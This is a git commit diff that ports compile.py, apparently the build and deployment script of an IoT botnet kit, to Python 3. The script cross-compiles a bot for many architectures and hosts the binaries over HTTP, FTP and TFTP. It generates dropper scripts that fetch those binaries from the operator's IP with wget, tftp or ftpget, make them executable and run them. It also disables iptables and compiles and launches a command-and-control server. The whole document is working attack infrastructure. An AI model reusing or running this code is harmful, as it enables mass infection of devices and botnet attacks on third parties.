1b1767dc34c1cc96f3b58776a96e98dbee73eeef
Windy 3 <itaasad84@gmail.com>
2025-07-25 16:20:09 +0700

    fixed for python3

--- compile.py
+++ compile.py
@@ -1,11 +1,11 @@
 import subprocess, sys
 
-bot = sys.argv[1]
-if len(sys.argv[2]) != 0:
-    ip = sys.argv[2]
-else:
-    print("\x1b[0;32mUsage: python " + sys.argv[0] + " bot.c 1.1.1.1 \x1b[0m")
+if len(sys.argv) < 3:
+    print("\x1b[0;32mUsage: python3 " + sys.argv[0] + " bot.c 1.2.3.4 \x1b[0m")
     exit(1)
+
+bot = sys.argv[1]
+ip = sys.argv[2]
 
 def system(cmd):
     subprocess.call(cmd, shell=True)
@@ -57,140 +57,107 @@ compilers = [
     "cross-compiler-loongarch64"
 ]
 
-update_server = raw_input("Update Server? Y/n: ")
+update_server = input("Update Server? Y/n: ")
 if update_server.lower() == "y":
-	print("Updating Server")
-	system("sudo apt update -y")
-else:
-    update_server = False
+    print("Updating Server")
+    system("sudo apt update -y")
 
-depends = raw_input("Install Dependencies? Y/n: ")
+depends = input("Install Dependencies? Y/n: ")
 if depends.lower() == "y":
     print("Installing Dependencies")
-    system("sudo apt install perl -y")
-    system("sudo apt install gcc* -y")
-    system("sudo apt install bzip2 -y")
-    system("sudo apt install gcc-c++ -y")
-    system("sudo apt install cpan -y")
-    system("sudo apt install httpd -y")
-    system("sudo apt install tftp -y")
-    system("sudo apt install screen -y")
-    system("sudo apt install nano -y")
-    system("sudo apt install unzip -y")
-    system("sudo apt install tar -y")
-    system("sudo apt install busybox -y")
-    system("sudo apt install python-paramiko -y")
-else:
-    depends_install = False
+    system("sudo apt install perl gcc* bzip2 g++ cpan httpd tftp screen nano unzip tar busybox python3-paramiko -y")
 
-download = raw_input("Download Cross Compilers? Y/n: ")
+download = input("Download Cross Compilers? Y/n: ")
 if download.lower() == "y":
-    get_arch = True
-else:
-    get_arch = False
-system("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
-if get_arch == True:
     system("rm -rf cross-compiler-*")
-
     print("Downloading Architectures")
-
     for arch in getarch:
-        system("wget " + arch + " --no-check-certificate >> /dev/null")
-        system("tar -xvf *tar.bz2")
-        system("rm -rf *tar.bz2")
-
+        system("wget " + arch + " --no-check-certificate -q")
+        system("tar -xf *tar.bz2")
+        system("rm -f *tar.bz2")
     print("Cross Compilers Downloaded...")
-num = 0
-for cc in compilers:
-    arch = cc.split("-")[2]
-    system("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + archnames[num] + " " + bot + " > /dev/null")
-    num += 1
 
-system("sudo apt install httpd -y")
+system("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
+
+# Compile binaries
+for num, cc in enumerate(compilers):
+    arch = cc.split("-")[2]
+    output = archnames[num]
+    system(f"./{cc}/bin/{arch}-gcc -static -pthread -D{arch.upper()} -o {output} {bot} > /dev/null 2>&1")
+
+# Setup services
+system("sudo apt install httpd xinetd tftp tftp-server vsftpd -y")
 system("service httpd start")
-system("sudo apt install xinetd tftp tftp-server -y")
-system("sudo apt install vsftpd -y")
 system("service vsftpd start")
-system('''echo -e "# default: off
-# description: The tftp server serves files using the trivial file transfer \
-#       protocol.  The tftp protocol is often used to boot diskless \
-#       workstations, download configuration files to network-aware printers, \
-#       and to start the installation process for some operating systems.
-service tftp
+
+system('''echo -e "service tftp
 {
-        socket_type             = dgram
-        protocol                = udp
-        wait                    = yes
-        user                    = root
-        server                  = /usr/sbin/in.tftpd
-        server_args             = -s -c /var/lib/tftpboot
-        disable                 = no
-        per_source              = 11
-        cps                     = 100 2
-        flags                   = IPv4
-}
-" > /etc/xinetd.d/tftp''')
+    socket_type     = dgram
+    protocol        = udp
+    wait            = yes
+    user            = root
+    server          = /usr/sbin/in.tftpd
+    server_args     = -s -c /var/lib/tftpboot
+    disable         = no
+    per_source      = 11
+    cps             = 100 2
+    flags           = IPv4
+}" > /etc/xinetd.d/tftp''')
+
 system("service xinetd start")
-system('''echo -e "listen=YES
-local_enable=NO
+
+system(f'''echo -e "listen=YES
 anonymous_enable=YES
-write_enable=NO
 anon_root=/var/ftp
-anon_max_rate=2048000
-xferlog_enable=YES
-listen_address='''+ ip +'''
+listen_address={ip}
 listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
+
 system("service vsftpd restart")
 
+# Generate dropper scripts
 system('echo -e "#!/bin/bash" > /var/www/html/bins.sh')
 for i in archnames:
-    system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
-	
+    system(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/{i}; chmod +x {i}; ./{i}; rm -rf {i}" >> /var/www/html/bins.sh')
+
 for i in archnames:
-    system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
+    system(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {ip} {i} {i}; chmod 777 {i}; ./{i}; rm -rf {i}" >> /var/ftp/ftp1.sh')
 
-system('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
-system('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
-system('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
+system('echo -e "#!/bin/bash\nulimit -n 1024\ncp /bin/busybox /tmp/" > /var/lib/tftpboot/tftp1.sh')
 for i in archnames:
-    system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
-	
-system('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
-system('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
-system('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
+    system(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp {ip} -c get {i}; chmod +x {i}; ./{i}" >> /var/lib/tftpboot/tftp1.sh')
+
+system('echo -e "#!/bin/bash\nulimit -n 1024\ncp /bin/busybox /tmp/" > /var/lib/tftpboot/tftp2.sh')
 for i in archnames:
-    system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
+    system(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r {i} -g {ip}; chmod +x {i}; ./{i}" >> /var/lib/tftpboot/tftp2.sh')
+
+# Move payloads
 for i in archnames:
-    system("cp " + i + " /var/www/html")
-    system("cp " + i + " /var/ftp")
-    system("mv " + i + " /var/lib/tftpboot")
+    system(f"cp {i} /var/www/html")
+    system(f"cp {i} /var/ftp")
+    system(f"mv {i} /var/lib/tftpboot")
 
-print("Stopping Iptables")
-system("service iptables stop")
-system("chkconfig iptables off")
-print("Restarting Xinetd")
-system("service xinetd restart")
-print("Restarting Httpd")
-system("service httpd restart")
+# Ulimit + iptables
+print("Disabling Iptables & Increasing Limits")
+system("service iptables stop || true")
+system("chkconfig iptables off || true")
+system("ulimit -n 999999; ulimit -u 999999")
+system("sysctl -w fs.file-max=999999")
+system('echo "ulimit -n 999999" >> ~/.bashrc')
+system('echo "ulimit -u 999999" >> ~/.bashrc')
 
-print("Changing Ulimit")
-system("ulimit -n 999999; ulimit -Sn 99999")
-system("ulimit -u 999999;ulimit -n 999999")
-system('echo -e "ulimit -n 99999" >> ~/.bashrc')
-system("sysctl -w fs.file-max=999999 >/dev/null")
-system('echo "#.bashrc">> .bashrc')
-system('echo "#ulimit set">> .bashrc')
-system('echo "ulimit -u 999999">> .bashrc')
-system('echo "ulimit -n 999999">> .bashrc')
+# Final Dropper Output
+system(f'''echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
+wget http://{ip}/bins.sh; chmod 777 bins.sh; sh bins.sh;
+tftp {ip} -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh;
+tftp -r tftp2.sh -g {ip}; chmod 777 tftp2.sh; sh tftp2.sh;
+ftpget -v -u anonymous -p anonymous -P 21 {ip} ftp1.sh ftp1.sh; sh ftp1.sh;
+rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *" >> ~/net/wget.txt''')
 
-system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp ' + ip + ' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g ' + ip + '; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *" >> ~/net/wget.txt')
-
-compile_cnc = raw_input("Cross Compile C&C And Screen It? Y/n: ")
+compile_cnc = input("Cross Compile C&C And Screen It? Y/n: ")
 if compile_cnc.lower() == "y":
-	print("Setting Up C&C")
-	system("service iptables stop")
-	system("cd ~/net; gcc cnc.c -o cnc -pthread")
-	system("cd ~/net; screen ./cnc "+botport+" "+threads+" "+cncport+"")
-else:
-    compile_cnc = False
-print ("Netis is a hakkka")
+    print("Compiling C&C")
+    system("service iptables stop || true")
+    system(f"cd ~/net; gcc cnc.c -o cnc -pthread")
+    system(f"cd ~/net; screen -dmS cnc ./cnc {botport} {threads} {cncport}")
+
+print("Finished.")
